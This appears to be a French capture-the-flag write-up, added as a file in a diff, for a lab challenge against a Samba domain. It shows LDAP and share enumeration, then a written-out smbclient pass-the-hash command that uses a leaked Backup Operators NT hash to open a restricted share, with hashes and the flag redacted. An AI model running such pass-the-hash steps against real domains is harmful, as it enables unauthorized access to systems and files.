@@ -1,0 +1,90 @@
+Source locale : operationtervalis/writeup-restricted-zone.md
+Copie documentaire expurgée ; les affirmations restent celles de la source.
+
+# Write-up — Challenge 09 : Restricted Zone
+
+## Objectif
+
+Accéder aux zones de l'infrastructure inaccessibles avec les privilèges initiaux (`svc_web`), puis soumettre le flag de la carte *Restricted Zone* (100 pts).
+
+## État initial
+
+Instance VPN `172.28.5.0/24` :
+
+| Hôte | IP VPN | Rôle |
+|---|---|---|
+| portail + ActiveMQ | `172.28.5.2` | Portail FBI (8080) + OpenWire (61616) |
+| dc01 | `172.28.5.3` | Contrôleur de domaine Samba (LDAP 389 / SMB 445 / KDC 88) |
+| fs01 | `172.28.5.5` | Serveur de fichiers |
+| mgmt01 | `172.28.5.4` | Management (pas de SMB) |
+
+Compte de service découvert : `svc_web` (LDAP bind, mot de passe dans `/opt/activemq/conf/ad-connector.properties`).
+
+## Reconnaissance
+
+### 1. Partage `Recon-Data` (challenge 08) → hashes de service
+
+Le partage caché `Recon-Data` sur le DC contient `ad_security_audit.txt`, qui expose les **hashes NT** des comptes de service :
+
+```text
+svc_mssql : <HEX_EXPURGE>
+svc_backup: <HEX_EXPURGE>
+svc_web   : <HEX_EXPURGE>  (périmé)
+svc_certsvc: <HEX_EXPURGE>
+```
+
+### 2. Énumération LDAP (svc_web)
+
+L'énumération LDAP confirme les groupes : `svc_backup` est membre de **Backup Operators** (`CN=Backup Operators,CN=Builtin,DC=valdoria,DC=fbi,DC=lab`), `svc_mssql` est membre de `DB-Admins` avec délégation contrainte.
+
+### 3. Énumération des partages du DC
+
+```bash
+smbclient -L //172.28.5.3 -U 'VALDORIA/svc_web%<omis>'
+#   sysvol, netlogon, IT-Share, IPC$
+```
+
+`IT-Share` est refusé pour `svc_web` (`NT_STATUS_ACCESS_DENIED`).
+
+## Exploitation : pass-the-hash `svc_backup`
+
+Le hash NT de `svc_backup` (Backup Operators) permet de s'authentifier sur le DC et d'accéder à `IT-Share` :
+
+```bash
+smbclient //172.28.5.3/IT-Share \
+  -U 'VALDORIA/svc_backup%<HEX_EXPURGE>' --pw-nt-hash -c 'ls'
+```
+
+Contenu :
+
+```text
+flag-i26.txt
+tims_digital_forensics.txt
+tims_digital_forensics.pdf
+delegation-notes.txt
+```
+
+`flag-i26.txt` contient le flag de la carte. Il est soumis tel quel.
+
+## Raisonnement
+
+1. `svc_web` ne donne accès qu'à `Recon-Data` (challenge 08), pas à `IT-Share`.
+2. Le hash NT de `svc_backup` (membre de **Backup Operators**) est fourni dans l'audit : il suffit d'un pass-the-hash, sans casser le mot de passe.
+3. `Backup Operators` dispose des privilèges de lecture sur les partages administratifs : `IT-Share` devient accessible.
+
+## Pistes qui ont échoué
+
+- `svc_web` sur `IT-Share` : `ACCESS_DENIED`.
+- `svc_backup` sur `fs01` (`172.28.5.5`) : `LOGON_FAILURE` (fs01 refuse explicitement `svc_backup`).
+- AS-REP roasting de `svc_backup` : `KDC_ERR_PREAUTH_FAILED` (le KDC Samba exige la pré-authentification malgré le flag `DONT_REQUIRE_PREAUTH`).
+
+## Validation reproductible (sans le flag)
+
+1. Lecture de `Recon-Data`/`ad_security_audit.txt` → hash NT de `svc_backup`.
+2. `smbclient //172.28.5.3/IT-Share -U 'VALDORIA/svc_backup%<hash>' --pw-nt-hash -c 'ls'`.
+3. Lecture de `flag-i26.txt` → flag.
+4. Soumission : la plateforme répond `Correct`.
+
+## Nettoyage
+
+Aucun compte n'a été modifié. Le hash NT et le flag ne sont pas reproduits dans ce document.
